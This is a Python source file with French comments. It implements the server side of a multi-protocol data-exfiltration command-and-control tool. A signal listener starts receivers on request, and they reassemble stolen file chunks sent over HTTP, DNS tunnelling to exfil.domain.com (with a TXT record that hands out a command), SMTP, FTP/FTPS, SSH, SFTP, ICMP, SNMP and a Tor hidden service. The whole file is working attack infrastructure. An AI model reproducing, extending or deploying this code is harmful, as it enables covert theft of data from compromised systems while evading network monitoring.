#!/usr/bin python3
import os
import sys
import ssl
import uuid
import time
import aioftp
import socket
import signal
import pathlib
import asyncio
import binascii
import platform
import asyncssh
import threading
import subprocess
import http.server
import socketserver
from pysnmp.smi import instrum
from urllib.parse import parse_qs
from email import message_from_bytes
from dnslib import RR, QTYPE, TXT, A
from pyftpdlib.servers import FTPServer
from pysnmp.entity import engine, config
from scapy.all import IP, ICMP, Raw, sniff
from aiosmtpd.controller import Controller
from pysnmp.carrier.asyncio.dgram import udp
from pysnmp.proto.rfc1902 import OctetString
from base64 import b32decode, urlsafe_b64decode
from dnslib.server import DNSServer, BaseResolver
from pyftpdlib.authorizers import DummyAuthorizer
from pysnmp.entity.rfc3413 import cmdrsp, context
from pyftpdlib.handlers import TLS_FTPHandler, FTPHandler
from flask import Flask, request, jsonify, redirect, send_from_directory

TIMEOUT = 30
PORT_DNS = 53
PORT_SSH = 22
PORT_FTP = 21
PORT_HTTP = 80
PORT_FTPS = 2121
PORT_SFTP = 2222
PORT_SMTP = 1025
PORT_SNMP = 16100
SIGNAL_PORT = 9999
CHUNK_FILE_SSH = ""
CHUNK_FILE_SMTP = ""
LIST_OPENED_SERVERS = []

# ========================
# FONCTIONS UTILITAIRES
# ========================

def writer_b64(chunk, chunk_file):
    if chunk:
        try:
            with open(chunk_file, "ab") as f:
                tmp = urlsafe_b64decode(chunk)
                f.write(tmp)
            print(f"[SERVEUR] Chunk écrit dans {chunk_file} ({len(chunk)} octets)")
        except Exception as e:
            print(f"[SERVEUR] Erreur écriture chunk : {e}")
    else:
        print("[SERVEUR] Chunk vide reçu")

def writer_dns(chunk, chunk_file):
    if chunk:
        try:
            with open(chunk_file, "ab") as f:
                f.write(chunk)
            print(f"[DNS] Chunk écrit dans {chunk_file} ({len(chunk)} octets)")
        except Exception as e:
            print(f"[DNS] Erreur écriture chunk : {e}")
    else:
        print("[DNS] Chunk vide reçu")

# ========================
# SERVEUR SMTP
# ========================

def start_smtp_server(chunk_file):

    if os.path.exists(chunk_file):
        os.remove(chunk_file)
    class MailHandler:
        async def handle_DATA(self, server, session, envelope):
            msg = message_from_bytes(envelope.content)

            for part in msg.walk():
                if part.get_content_disposition() == "attachment":
                    with open(chunk_file, "ab") as f:
                        f.write(urlsafe_b64decode(part.get_payload(decode=True)))
                    print(f"[SMTP] Pièce jointe sauvegardée : {chunk_file}")

            return "250 OK - Pièces jointes enregistrées"

    handler = MailHandler()
    controller = Controller(handler, hostname="0.0.0.0", port=PORT_SMTP)
    controller.start()
    print("Serveur SMTP prêt sur 127.0.0.1:1025")

    def watchdog():
        start_time = time.time()
        while True:
            time.sleep(1)
            if time.time() - start_time > TIMEOUT:
                print(f"[!] Aucune activité SMTP depuis {TIMEOUT}s — arrêt du serveur SMTP")
                controller.stop()
                LIST_OPENED_SERVERS.pop(LIST_OPENED_SERVERS.index("smtp"))
                break

    threading.Thread(target=watchdog, daemon=True).start()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_forever()
    finally:
        controller.stop()
        loop.close()

# ========================
# SERVEUR HTTP
# ========================

class CnCRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path != "/exfil":
            self.send_response(404)
            self.end_headers()
            return

        self.server.last_activity_time = time.time()
        length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(length).decode()
        params = parse_qs(post_data)

        chunk = params.get("chunk", [""])[0]
        print(f"[HTTP] Chunk reçu ({len(chunk)} octets)")
        writer_b64(chunk, self.server.chunk_file)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        return  # Supprime les logs par défaut

def start_http_server(chunk_file):
    if os.path.exists(chunk_file):
        os.remove(chunk_file)

    class CustomHTTPServer(socketserver.TCPServer):
        def __init__(self, server_address, handler_class):
            super().__init__(server_address, handler_class)
            self.chunk_file = chunk_file
            self.last_activity_time = time.time()
            self.allow_reuse_address = True

    with CustomHTTPServer(("", PORT_HTTP), CnCRequestHandler) as httpd:
        def watchdog():
            while True:
                time.sleep(1)
                elapsed = time.time() - httpd.last_activity_time
                if elapsed > TIMEOUT:
                    print(f"[!] Aucune activité HTTP depuis {TIMEOUT}s — arrêt du serveur")
                    httpd.shutdown()
                    LIST_OPENED_SERVERS.pop(LIST_OPENED_SERVERS.index("http"))
                    break

        threading.Thread(target=watchdog, daemon=True).start()

        print(f"[*] Serveur HTTP en écoute sur le port {PORT_HTTP}")
        httpd.serve_forever()
        print("[*] Serveur HTTP arrêté")

# ========================
# SERVEUR DNS
# ========================

class ExfilResolver(BaseResolver):
    def __init__(self, chunk_file):
        self.chunk_file = chunk_file

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        qtype = QTYPE[request.q.qtype]

        print(f"[DNS] Requête reçue : {qname} ({qtype})")

        if qtype == "A" and qname.endswith(".exfil.domain.com."):
            try:
                base = qname.split(".")[0]
                data = b32decode(base.upper())
                writer_dns(data, self.chunk_file)
            except Exception as e:
                print(f"[DNS] Erreur décodage : {e}")

            reply = request.reply()
            reply.add_answer(RR(rname=qname, rtype=QTYPE.A, ttl=60, rdata=A("127.0.0.1")))
            return reply

        if qtype == "TXT" and qname == "getcmd.exfil.domain.com.":
            reply = request.reply()
            reply.add_answer(RR(rname=qname, rtype=QTYPE.TXT, ttl=60, rdata=TXT("shutdown -a")))
            print("[DNS] Commande TXT envoyée : shutdown -a")
            return reply

        return request.reply()

def start_dns_server(chunk_file):
    if os.path.exists(chunk_file):
        os.remove(chunk_file)

    class TimedResolver(ExfilResolver):
        def __init__(self, chunk_file):
            super().__init__(chunk_file)
            self.last_activity_time = time.time()

        def resolve(self, request, handler):
            self.last_activity_time = time.time()
            return super().resolve(request, handler)

    resolver = TimedResolver(chunk_file)
    server = DNSServer(resolver, port=PORT_DNS, address="0.0.0.0", logger=None)

    def watchdog():
        while True:
            time.sleep(1)
            elapsed = time.time() - resolver.last_activity_time
            if elapsed > TIMEOUT:
                print(f"[!] Aucune activité DNS depuis {TIMEOUT}s — arrêt du serveur DNS")
                server.stop()
                LIST_OPENED_SERVERS.pop(LIST_OPENED_SERVERS.index("dns"))
                break

    print(f"[*] Serveur DNS en écoute sur le port {PORT_DNS}")
    threading.Thread(target=watchdog, daemon=True).start()
    server.start()

# ========================
# SERVEUR FTP
# ========================

def start_ftp_server(chunk_file):
    if os.path.exists(chunk_file):
        os.remove(chunk_file)
    os.makedirs(os.path.dirname(chunk_file), exist_ok=True)

    root_dir = os.path.dirname(os.path.abspath(chunk_file))

    authorizer = DummyAuthorizer()
    authorizer.add_user("user", "password", root_dir, perm="elradfmw")

    class MyHandler(FTPHandler):
        last_activity_time = time.time()

        def __init__(self, conn, server, ioloop=None):
            super().__init__(conn, server, ioloop)
            MyHandler.last_activity_time = time.time()

        def on_file_received(self, file_path):
            with open(chunk_file, "ab") as dest, open(file_path, "rb") as src:
                dest.write(urlsafe_b64decode(src.read()))
            os.remove(file_path)
            MyHandler.last_activity_time = time.time()
            print("[FTP] Chunk reçu et écrit dans", chunk_file)

    handler = MyHandler
    handler.authorizer = authorizer

    server = FTPServer(("0.0.0.0", PORT_FTP), handler)
    print(f"[*] Serveur FTP prêt sur le port {PORT_FTP}, fichier : {chunk_file}")

    def watchdog():
        while True:
            time.sleep(1)
            if time.time() - handler.last_activity_time > TIMEOUT:
                print(f"[!] Aucune activité FTP depuis {TIMEOUT}s — arrêt du serveur FTP")
                server.close_all()
                LIST_OPENED_SERVERS.pop(LIST_OPENED_SERVERS.index("ftp"))
                break

    threading.Thread(target=watchdog, daemon=True).start()
    server.serve_forever()

# ========================
# SERVEUR FTPS
# ========================

def start_ftps_server(chunk_file):
    print("[FTPS] Starting FTPS server")
    if os.path.exists(chunk_file):
        os.remove(chunk_file)
    os.makedirs(os.path.dirname(chunk_file), exist_ok=True)

    authorizer = DummyAuthorizer()
    authorizer.add_user("user", "password", os.path.dirname(chunk_file), perm="elradfmw")

    class MyFTPSHandler(TLS_FTPHandler):
        last_activity_time = time.time()

        def __init__(self, conn, server, ioloop=None):
            super().__init__(conn, server, ioloop)
            MyFTPSHandler.last_activity_time = time.time()

        def on_file_received(self, file_path):
            # Append raw binary directly, no base64 decoding
            with open(chunk_file, "ab") as dest, open(file_path, "rb") as src:
                dest.write(src.read())
            os.remove(file_path)
            MyFTPSHandler.last_activity_time = time.time()
            print("[FTPS] Chunk reçu et écrit dans", chunk_file)

    handler = MyFTPSHandler
    handler.authorizer = authorizer
    handler.certfile = "certificat/server.pem"
    handler.tls_control_required = False  # explicit FTPS
    handler.tls_data_required = True      # encrypt data channel

    server = FTPServer(("0.0.0.0", PORT_FTPS), handler)
    print(f"[*] FTPS server ready on port {PORT_FTPS}, writing to: {chunk_file}")

    def watchdog():
        while True:
            time.sleep(1)
            if time.time() - handler.last_activity_time > TIMEOUT:
                print(f"[!] No FTPS activity for {TIMEOUT}s — shutting down FTPS server")
                server.close_all()
                if "ftps" in LIST_OPENED_SERVERS:
                    LIST_OPENED_SERVERS.remove("ftps")
                break

    threading.Thread(target=watchdog, daemon=True).start()
    server.serve_forever()

# ========================
# EXFILTRATION SSH
# ========================

class MySSHServer(asyncssh.SSHServer):
    def connection_made(self, conn):
        print(f'[SSH] Connexion depuis {conn.get_extra_info("peername")}')

    def connection_lost(self, exc):
        print('[SSH] Déconnecté' if exc is None else f'[SSH] Déconnecté avec erreur : {exc}')

async def handle_client(process):
    print("[SSH] Client connecté")
    data = await process.stdin.readline()
    print(f"[SSH] Données reçues et écrites dans {CHUNK_FILE_SSH}")
    with open(CHUNK_FILE_SSH, 'ab') as f:
        f.write(urlsafe_b64decode(data))
    process.exit(0)

async def ssh_server():
    
    server = await asyncssh.create_server(
        lambda: MySSHServer(),
        '', PORT_SSH,
        authorized_client_keys='keys/authorized_keys',
        server_host_keys=['keys/ssh_host_key'],
        process_factory=handle_client
    )
    print("[SSH] Serveur démarré sur le port 22")
    try:
        await asyncio.Future()
    except asyncio.CancelledError:
        print("[SSH] Serveur arrêté")

def start_ssh_server(chunk_file):
    print("[SSH] Démarrage du serveur SSH")
    if os.path.exists(chunk_file):
        os.remove(chunk_file)
    os.makedirs(os.path.dirname(chunk_file), exist_ok=True)
    
    global CHUNK_FILE_SSH

    CHUNK_FILE_SSH = chunk_file
    asyncio.run(ssh_server())

# ========================
# SERVEUR SFTP
# ========================

import asyncssh
import tempfile

class MySFTPServer(asyncssh.SFTPServer):
    """Simple et correct : retourne un NamedTemporaryFile dans open()
       et traite le tmp dans close(). Aucun nom non défini."""
    last_activity_time = time.time()

    def __init__(self, chan, chunk_file):
        super().__init__(chan)
        self.chunk_file = chunk_file

    def open(self, filename, pflags, attrs):
        MySFTPServer.last_activity_time = time.time()

        tmp = tempfile.NamedTemporaryFile(prefix="sftp_recv_", suffix=".tmp", delete=False, mode="w+b")
        return tmp

    def close(self, file_obj):
        """Called when client closes the handle.
           Read tmp, decode if possible, append to chunk_file, then remove tmp."""
        try:
            tmp_path = getattr(file_obj, "name", None)
            try:
                file_obj.flush()
            except Exception:
                pass
            try:
                file_obj.close()
            except Exception:
                pass

            if not tmp_path or not os.path.exists(tmp_path):
                print(f"[SFTP] close(): tmp file missing: {tmp_path}")
                MySFTPServer.last_activity_time = time.time()
                return

            with open(tmp_path, "rb") as src:
                data = src.read()
            try:
                decoded = urlsafe_b64decode(data)
            except Exception:
                decoded = data

            try:
                os.makedirs(os.path.dirname(self.chunk_file), exist_ok=True)
                with open(self.chunk_file, "ab") as dest:
                    dest.write(decoded)
                print(f"[SFTP] Chunk écrit dans {self.chunk_file} (depuis {tmp_path})")
            except Exception as e:
                print(f"[SFTP] Erreur écriture chunk_file: {e}")

            try:
                os.remove(tmp_path)
            except Exception as e:
                print(f"[SFTP] Impossible de supprimer tmp {tmp_path}: {e}")

        except Exception as e:
            print(f"[SFTP] Exception dans close(): {e}")
        finally:
            MySFTPServer.last_activity_time = time.time()
        

class MySSHServer_SFTP(asyncssh.SSHServer):
    def connection_made(self, conn):
        print(f'[SFTP] Connexion depuis {conn.get_extra_info("peername")}')

    def connection_lost(self, exc):
        print('[SFTP] Déconnecté' if exc is None else f'[SFTP] Déconnecté avec erreur : {exc}')

async def start_sftp_async(chunk_file):
    if os.path.exists(chunk_file):
        os.remove(chunk_file)
    os.makedirs(os.path.dirname(chunk_file), exist_ok=True)

    server = await asyncssh.create_server(
        lambda: MySSHServer_SFTP(),
        '', PORT_SFTP,
        authorized_client_keys='keys/authorized_keys',
        server_host_keys=['keys/ssh_host_key'],
        sftp_factory=lambda chan: MySFTPServer(chan, chunk_file)
    )

    print(f"[*] Serveur SFTP démarré sur le port {PORT_SFTP}")

    MySFTPServer.last_activity_time = time.time()
    
    async def watchdog():
        while True:
            await asyncio.sleep(1)
            if time.time() - MySFTPServer.last_activity_time > TIMEOUT:
                print(f"[!] Aucune activité SFTP depuis {TIMEOUT}s — arrêt du serveur SFTP")
                server.close()
                LIST_OPENED_SERVERS.pop(LIST_OPENED_SERVERS.index("sftp"))
                break

    asyncio.create_task(watchdog())

    try:
        await server.wait_closed()
    except asyncio.CancelledError:
        print("[SFTP] Serveur arrêté")

def start_sftp_server(chunk_file):
    print("[SFTP] Démarrage du serveur SFTP")
    asyncio.run(start_sftp_async(chunk_file))

# ========================
# EXFILTRATION ICMP
# ========================

def start_icmp_server(chunk_file="recu.txt", nombre_paquets=None):
    if os.path.exists(chunk_file):
        os.remove(chunk_file)

    # Crée un socket RAW ICMP (nécessite sudo/root)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    print("[*] Serveur ICMP démarré. En attente des paquets...")
    first_packet = True
    real_adress = None

    paquets_recus = []

    try:
        while True:
            data, addr = s.recvfrom(2030)
            if first_packet:
                real_adress = addr[0]
                first_packet = False
                print(f"[ICMP] Première adresse source : {real_adress}")

            if addr[0] != real_adress:
                print(f"[ICMP] Paquet reçu d'une adresse différente : {addr[0]} (attendu : {real_adress})")
                continue

            # On récupère le header ICMP (30 octets) + payload
            icmp_header_len = 28
            payload = data[icmp_header_len:]
            writer_b64(payload.decode(), chunk_file)
            paquets_recus.append(payload)

            if nombre_paquets and len(paquets_recus) >= nombre_paquets:
                break
    except KeyboardInterrupt:
        print("\n[*] Arrêt manuel du serveur.")

    # Reconstruction du fichier
    with open(chunk_file, "wb") as f:
        for paquet in paquets_recus:
            f.write(paquet)
    print(f"[*] Fichier reconstruit dans {chunk_file}")

# ========================
# EXFILTRATION SNMP
# ========================

def start_snmp_server(chunk_file):
    loop = asyncio.new_event_loop()  # Create a new event loop
    asyncio.set_event_loop(loop)      # Set the new event loop
    snmpEngine = engine.SnmpEngine()  

    config.add_transport(
        snmpEngine,
        udp.DOMAIN_NAME,
        udp.UdpTransport().open_server_mode(("0.0.0.0", PORT_SNMP)),
    )
    config.add_v1_system(snmpEngine, "public-area", "public")
    config.add_vacm_user(
        snmpEngine,
        2, "public-area", "noAuthNoPriv",
        readSubTree=(1,3,6,1,2,1),
        writeSubTree=(1,3,6,1,2,1),
    )

    snmpContext = context.SnmpContext(snmpEngine)
    mibInstrum = snmpContext.get_mib_instrum()
    mibBuilder = mibInstrum.get_mib_builder()

    MibScalarInstance, = mibBuilder.import_symbols("SNMPv2-SMI", "MibScalarInstance")
    (sysLocation,) = mibBuilder.import_symbols("SNMPv2-MIB", "sysLocation")
    if os.path.exists(chunk_file):
        os.remove(chunk_file)

    class WritableLocation(MibScalarInstance):
        def writeCommit(self, varBind, **context):
            name, val = varBind
            message = urlsafe_b64decode(val.prettyPrint())
            print(f"[SNMP] Chunk reçu ({len(message)} octets), écrit dans {chunk_file}")
            with open(chunk_file, "ab") as f:
                f.write(message)
            return name, val

    writable = WritableLocation(sysLocation.name, (0,), sysLocation.syntax.clone("No message yet"))
    mibBuilder.export_symbols("__MY-MIB", sysLocationWritable=writable)

    cmdrsp.GetCommandResponder(snmpEngine, snmpContext)
    cmdrsp.SetCommandResponder(snmpEngine, snmpContext)

    print("[*] Serveur SNMP démarré. En attente des paquets...")

    snmpEngine.transport_dispatcher.job_started(1)
    try:
        snmpEngine.transport_dispatcher.run_dispatcher(timeout=30)
    except KeyboardInterrupt:
        pass
    finally:
        print(f"[!] Aucune activité SNMP depuis {TIMEOUT}s — arrêt du serveur SNMP")
        # Fermer proprement le dispatcher pour éviter les avertissements de tâches en attente
        try:
            snmpEngine.transport_dispatcher.close_dispatcher()
        except Exception as e:
            print(f"[SNMP] Erreur lors de la fermeture du dispatcher: {e}")

# ========================
# EXFILTRATION TOR (HTTP)
# ========================

def start_tor_server(chunk_file, port=8080):

    app = Flask(__name__)

    if os.path.exists(chunk_file):
        os.remove(chunk_file)
    os.makedirs(os.path.dirname(chunk_file), exist_ok=True)
    system = platform.system()

    if system == "Linux":
        process = subprocess.Popen(("sudo", "-u", "debian-tor", "tor", "-f", "/etc/tor/torrc"))
        print("Waiting for Tor to bootstrap...")
        time.sleep(10)  # pour laisser le temps à Tor de se connecter
    
    elif system == "Windows":
        tor_path = pathlib.Path("../tor/tor.exe")
        if not tor_path.exists():
            print("Tor executable not found at ../tor/tor.exe")
            return
        process = subprocess.Popen((str(tor_path), "-f", "../tor/torrc"))
        print("Waiting for Tor to bootstrap...")
        time.sleep(10)  # pour laisser le temps à Tor de se connecter

    @app.route("/upload", methods=["POST"])
    def upload():
        filename = f"chunk_{uuid.uuid4().hex[:8]}.txt"
        file = request.files.get("file")
        if not file:
            return jsonify({"error": "No file uploaded"}), 400
        file.save(filename)
        with open(filename, "rb") as f:
            chunk = f.read()
        with open(chunk_file, "ab") as f:
            f.write(chunk)
        os.remove(filename)
        return jsonify({"status": f"Received {file.filename}"}), 200

    @app.route("/")
    def index():
        return redirect("/index.html")

    @app.route("/<path:path>")
    def static_proxy(path):
        return send_from_directory(".", path)

    app.run(host="127.0.0.1", port=8080) #Port will be 9050 at the onion address
    process.send_signal(signal.SIGINT)
    print("Tor stopped.")

# ========================
# SIGNALISATION
# ========================

def signal_listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', SIGNAL_PORT))
        s.listen(5)
        print(f"[*] Serveur de signalisation en écoute sur le port {SIGNAL_PORT}")
        while True:
            conn, addr = s.accept()
            with conn:
                data = conn.recv(1024)
                if data:
                    data_list = data.decode().strip()
                    print(f"[+] Signal reçu de {addr[0]}: {data_list}")
                    try:
                        arg, signal_type = data_list.split(" ")
                        chunk_file = arg.split("\\")[-1].split("/")[-1]
                        chunk_file = os.path.join("reception/", chunk_file)

                        if signal_type == "http" and (signal_type not in LIST_OPENED_SERVERS):
                            LIST_OPENED_SERVERS.append(signal_type)
                            thread = threading.Thread(target=start_http_server, args=(chunk_file,), daemon=True)
                            thread.start()
                        elif signal_type == "dns" and (signal_type not in LIST_OPENED_SERVERS):
                            LIST_OPENED_SERVERS.append(signal_type)
                            thread = threading.Thread(target=start_dns_server, args=(chunk_file,), daemon=True)
                            thread.start()
                        elif signal_type == "smtp" and (signal_type not in LIST_OPENED_SERVERS):
                            LIST_OPENED_SERVERS.append(signal_type)
                            thread = threading.Thread(target=start_smtp_server, args=(chunk_file,), daemon=True)
                            thread.start()
                        elif signal_type == "ftp" and (signal_type not in LIST_OPENED_SERVERS):
                            LIST_OPENED_SERVERS.append(signal_type)
                            thread = threading.Thread(target=start_ftp_server, args=(chunk_file,), daemon=True)
                            thread.start()
                        elif signal_type == "ftps" and (signal_type not in LIST_OPENED_SERVERS):
                            LIST_OPENED_SERVERS.append(signal_type)
                            thread = threading.Thread(target=lambda: asyncio.run(start_ftps_server(chunk_file)), daemon=True).start()
                            thread.start()
                        elif signal_type == "ssh" and (signal_type not in LIST_OPENED_SERVERS):
                            LIST_OPENED_SERVERS.append(signal_type)
                            thread = threading.Thread(target=start_ssh_server, args=(chunk_file,), daemon=True)
                            thread.start()
                        elif signal_type == "sftp" and (signal_type not in LIST_OPENED_SERVERS):
                            LIST_OPENED_SERVERS.append(signal_type)
                            thread = threading.Thread(target=start_sftp_server, args=(chunk_file,), daemon=True)
                            thread.start()
                        elif signal_type == "icmp" and (signal_type not in LIST_OPENED_SERVERS):
                            LIST_OPENED_SERVERS.append(signal_type)
                            thread = threading.Thread(target=start_icmp_server, args=(chunk_file,), daemon=True)
                            thread.start()
                        elif signal_type == "snmp" and (signal_type not in LIST_OPENED_SERVERS):
                            LIST_OPENED_SERVERS.append(signal_type)
                            thread = threading.Thread(target=start_snmp_server, args=(chunk_file,))
                            thread.start()
                    except Exception as e:
                        print(f"[!] Erreur de parsing du signal : {e}")

# ========================
# MAIN
# ========================

if __name__ == "__main__":
    if len(sys.argv) > 1:
        print(f"Utilisation : {sys.argv[0]}")
        sys.exit(84)

    if not os.path.exists("reception"):
        os.makedirs("reception")

    signal_thread = threading.Thread(target=signal_listener, daemon=True)
    signal_thread.start()
 
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Serveur arrêté")
